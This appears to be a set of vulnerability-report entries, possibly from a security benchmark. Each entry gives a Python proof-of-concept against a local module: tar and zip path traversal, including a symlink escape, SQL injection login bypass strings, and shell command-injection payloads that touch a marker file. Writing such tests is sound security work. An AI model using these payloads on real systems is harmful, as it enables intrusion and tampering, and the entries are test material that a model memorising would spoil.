src/data-isolation-and-lifecycle.title: Tar member paths escape the destination in extract()

threat_model.attacker: attacker who supplies the tar archive

src/data-isolation-and-lifecycle.description: Claims '../', absolute or symlinked member names write outside dest.

poc.content:
import io, os, tarfile, tempfile, importlib.util
s = importlib.util.spec_from_file_location('extract', 'src/extract.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)
escaped = []
for name, kind in [('../pwned1.txt', 'file'), (os.path.join(work, 'pwned2.txt'), 'file'),
                   ('link', 'symlink')]:
    tarp = os.path.join(work, 'mal.tar')
    with tarfile.open(tarp, 'w') as tf:
        if kind == 'symlink':
            info = tarfile.TarInfo('link'); info.type = tarfile.SYMTYPE; info.linkname = work
            tf.addfile(info)
            data = b'owned'; f = tarfile.TarInfo('link/pwned3.txt'); f.size = len(data)
            tf.addfile(f, io.BytesIO(data))
        else:
            data = b'owned'; info = tarfile.TarInfo(name); info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    try:
        m.extract(tarp, dest)
    except Exception:
        pass
for n in ('pwned1.txt', 'pwned2.txt', 'pwned3.txt'):
    if os.path.exists(os.path.join(work, n)):
        escaped.append(n)
assert escaped, 'no escape'
print('TRAVERSAL_OK', escaped)

src/data-isolation-and-lifecycle.title: Zip entry names escape the destination in unzip()

threat_model.attacker: attacker who supplies the zip archive

src/data-isolation-and-lifecycle.description: Claims '../' or absolute entry names write outside dest.

poc.content:
import os, zipfile, tempfile, importlib.util
s = importlib.util.spec_from_file_location('unzip', 'src/unzip.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)
escaped = []
for name in ('../pwned1.txt', os.path.join(work, 'pwned2.txt')):
    zp = os.path.join(work, 'mal.zip')
    with zipfile.ZipFile(zp, 'w') as zf:
        zf.writestr(zipfile.ZipInfo(name), b'owned')
    try:
        m.unzip(zp, dest)
    except Exception:
        pass
for n in ('pwned1.txt', 'pwned2.txt'):
    if os.path.exists(os.path.join(work, n)):
        escaped.append(n)
assert escaped, 'no escape'
print('ZIPSLIP_OK', escaped)

src/web-protocol-and-auth.title: SQL injection auth bypass in login()
src/web-protocol-and-auth.description: Claims a crafted username or password bypasses the password check.

poc.content:
import os, tempfile, importlib.util
s = importlib.util.spec_from_file_location('auth', 'src/auth.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); db = os.path.join(work, 'app.db')
m.init_db(db); m.add_user(db, 'admin', 's3cret')
bypassed = [p for p in [('admin', "x' OR '1'='1"), ("admin'--", 'x'), ("' OR 1=1--", 'x')]
            if m.login(db, *p) is True]
assert bypassed, 'no bypass'
print('SQLI_OK', bypassed)

src/cloud-and-deployment.title: OS command injection in ping()
src/cloud-and-deployment.description: Claims shell metacharacters in host run arbitrary commands.

poc.content:
import os, tempfile, importlib.util
s = importlib.util.spec_from_file_location('net', 'src/net.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); marker = os.path.join(work, 'pwned')
for payload in ('localhost; touch ' + marker, 'localhost && touch ' + marker,
                '$(touch ' + marker + ')', '`touch ' + marker + '`'):
    try:
        m.ping(payload)
    except Exception:
        pass
assert os.path.exists(marker), 'no injection'
print('CMDI_OK')
